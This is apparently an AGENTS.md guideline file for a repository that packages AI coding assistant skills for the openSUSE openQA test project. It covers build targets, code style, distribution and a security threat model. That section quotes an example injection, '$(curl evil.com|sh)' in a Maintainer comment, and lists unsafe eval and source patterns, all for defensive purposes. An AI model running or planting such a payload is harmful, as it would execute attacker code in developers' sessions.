# Agent Guidelines for os-autoinst-distri-opensuse-gemini

This repository develops and maintains **AI coding assistant skills and
commands** for the `os-autoinst-distri-opensuse` (OSADO) project. It is
packaged as a Gemini CLI extension and also supports OpenCode, Claude Code,
and Pi Agent via the [Agent Skills open standard](https://agentskills.io).

Your focus is on creating, refining, validating and distributing
 skills that help OSADO developers.
See `README.md` for installation options and user-facing documentation.

## 1. Build, Lint, and Test

Run `make help` to list all targets. Key targets:

```bash
make test              # installer tests + shellcheck + all manifest checks (no container needed)
make test-integration  # integration tests in container
make clean             # remove test artifacts
```

Manifest validation targets (all included in `make test`):
- `make gemini-check` — validates `gemini-extension.json`
- `make claude-plugincheck` — validates `.claude-plugin/` manifests and version sync
- `make antigravity-check` — validates root `plugin.json` (schema + name sync)
- `make skillcheck` — validates `SKILL.md` frontmatter in all skills

Always run `make test` before committing. Run `make test-integration` when
modifying skills or the install script.

Linting: `make lint`.

Ensure valid YAML frontmatter in all `SKILL.md` files.

## 2. Code Style

### Bash (`*.sh`)
*   Shebang: `#!/bin/bash`. Start with `set -e`.
*   4-space indent. Lines ≤100 chars. Use `[[ ]]` not `[ ]`.
*   `snake_case` for variables/functions; `UPPER_CASE` for globals/constants.
*   `local` for all function variables.
*   Logging: use `log_info`, `log_success`, `log_warn`, `log_error` (see `tools/install.sh`).
*   Resolve paths to absolute (`$(cd ... && pwd)`). Self-locate with `dirname "${BASH_SOURCE[0]}"`.
*   Prefer `awk`/`sed` over Bash loops for text processing.

### Perl (`*.pl`)
*   `use strict; use warnings;` always.
*   `Getopt::Long` for CLI args. Support `--help`, `--repo`, `--json`, `--verbose`.
*   POD `=head2` for each function (except `print_usage`).
*   `snake_case` naming. Standard library only (no CPAN).
*   `JSON::PP` for structured output. `die` on unrecoverable errors.
*   Self-locate with `dirname(abs_path($0))`.

### Skill Definitions (`SKILL.md`)
*   YAML frontmatter with `name` and `description`.
*   Wrap prompt body in `<instructions>` XML tags.
*   Put logic in `scripts/`, not in Markdown. Use `assets/` for templates.

### Custom Commands (`commands/`)
*   TOML files with `description` and `prompt`. Gemini CLI only.
*   Use `"""` for multi-line prompts and `!{shell command}` for dynamic context.

## 3. Architecture


### Repository Structure

```
.
├── plugin.json              # Plugin manifest (for native Antigravity CLI install)
├── gemini-extension.json    # Extension manifest (for native Gemini install)
├── .claude-plugin/          # Plugin manifest (for native Claude Code install)
│   ├── plugin.json
│   └── marketplace.json
├── ocx/                     # OCX registry (for OCX extension manager)
│   ├── registry.jsonc       #   Source manifest (v2 schema)
│   └── files/skills -> ../../skills  #   Symlink for ocx build
├── OSADO_AGENTS.md          # Agent guidelines deployed to OSADO (context + workflow)
├── skills/                  # Agent skills (SKILL.md + scripts)
│   ├── local-lint-test/
│   ├── vr-planner/
│   ├── test-catalog/
│   ├── openqa-log-analyzer/
│   ├── openqa-log-fetcher/
│   ├── git-commit/
│   ├── github-pr-create/
│   └── unit-test-wizard/
├── commands/                # Custom commands (Gemini CLI only, TOML)
│   └── osado/
│       ├── git_commit.toml
│       └── github_pr_create.toml
├── tools/
│   └── install.sh           # Multi-harness installer (opencode/antigravity/gemini/claude/agents)
├── t/                       # Test suite
├── docs/                    # Project documentation
│   └── pages/index.html     #   GitHub Pages landing page
└── ideas/                   # Research and working artifacts
```

### Distribution Model
This repository supports multiple installation strategies:

| Method | For whom | Mechanism |
|--------|----------|-----------|
| `gemini extensions install` | Gemini CLI users | Native extension |
| `claude plugin marketplace add` | Claude Code users | Native plugin |
| `agy plugin install` | Antigravity CLI users | Native plugin |
| `tools/install.sh` | All users (no native CLI needed) | Symlink overlay |
| `gemini extensions link .` | Developers of this repo | Local dev testing |
| Manual copy to `.agents/skills/` | OpenCode/Pi Agent users | File-based |
| Manual copy to `.claude/skills/` | Claude Code users (alt) | File-based |

### Key Files

| File | Purpose |
|------|---------|
| `plugin.json` | Plugin manifest (Antigravity CLI) |
| `gemini-extension.json` | Extension manifest (Gemini CLI) |
| `.claude-plugin/plugin.json` | Plugin manifest (Claude Code) |
| `.claude-plugin/marketplace.json` | Marketplace manifest (Claude Code) |
| `GEMINI.md` | Agent context loaded by Gemini CLI |
| `OSADO_AGENTS.md` | Agent guidelines deployed to OSADO repos |
| `skills/` | Agent skills (`SKILL.md` + `scripts/`) |
| `commands/` | Custom slash commands (TOML, Gemini CLI only) |
| `tools/install.sh` | Multi-harness symlink installer |
| `Makefile` | Development build/test/lint targets |
| `AGENTS.md` | Developer guidelines for THIS repo (this file) |

### Common Tasks

**Adding a new Skill:**
1.  Create `skills/<name>/SKILL.md` with YAML frontmatter.
2.  Add `scripts/` and `assets/` as needed.
3.  Run `make test` to verify linking and linting.
4.  Test with `gemini extensions link .` and start a new session.

**Modifying the Install Script:**
Edit `tools/install.sh`, then run `make test` to verify no regressions.

## 4. Safety Rules

1.  **Non-Destructive:** The install script never overwrites a file that is not a symlink to this repo.
2.  **Conflict Awareness:** New files must not conflict with common user filenames.
3.  **Symlink Logic:** The installer mirrors directory structure (`mkdir -p`) but symlinks individual files.
4.  **No Secrets:** Never hardcode API keys or credentials.
5.  **Injection Prevention:** Sanitize user input passed to shell scripts.
6.  **No PII:** Do not mention specific users, GitHub handles, or team names.

## 5. Security: Skill Scripts and Untrusted File Content

Skill scripts in `skills/*/scripts/` are executed **by LLM agents** on
files that may contain **attacker-controlled content** (e.g., a malicious
PR to the target repo). This context demands higher security standards than
typical developer tooling.

### Threat Model

An attacker gets malicious content merged into the target repo's main branch
unnoticed (e.g., a crafted `# Maintainer:` comment that passes casual code
review). Later, a legitimate developer works on that same file and invokes a
skill via their LLM agent. If the skill script interprets file content as
code (e.g., via `eval`), the attacker's payload executes in the developer's
agent session.

### Example Attack

A file contains `# Maintainer: $(curl evil.com|sh)`. An awk script extracts
this value and emits `MAINTAINER_VALUE="$(curl evil.com|sh)"`. The shell
`eval` on this output executes the injection.

### Prohibited Patterns

| Pattern | Risk | Safe Alternative |
|---------|------|------------------|
| `eval "$var"` where `$var` contains file-derived data | Command injection via `$()`, backticks, or quote-breaking | `readarray` + positional awk output |
| `source <(command_reading_file)` | Same as eval | Parse output with `read` or arrays |
| Unquoted `$var` in `for` loops with `find` output | Word splitting on crafted filenames | `while IFS= read -r -d ''` with `find -print0` |
| `printf -v varname "$untrusted"` | Format string injection | Validate input before printf |

### Mandatory Practices for Skill Scripts

1.  **Never use `eval`** on data derived from file content. If awk/sed
    produces structured output, use `readarray -t` with line-per-value
    format instead.
2.  **Quote all variables** in command arguments and use `[[ ]]` for tests.
3.  **Validate format** of any value extracted from untrusted files before
    using it in output or passing it to other tools.
4.  **Use `find -print0 | while read -r -d ''`** instead of
    `for file in $(find ...)` when iterating over file paths.
5.  **ShellCheck with `--enable=all --severity=warning`** is enforced by the
    Makefile. SC2154 warnings ("referenced but not assigned") often indicate
    an `eval` pattern and must be resolved structurally, not suppressed.

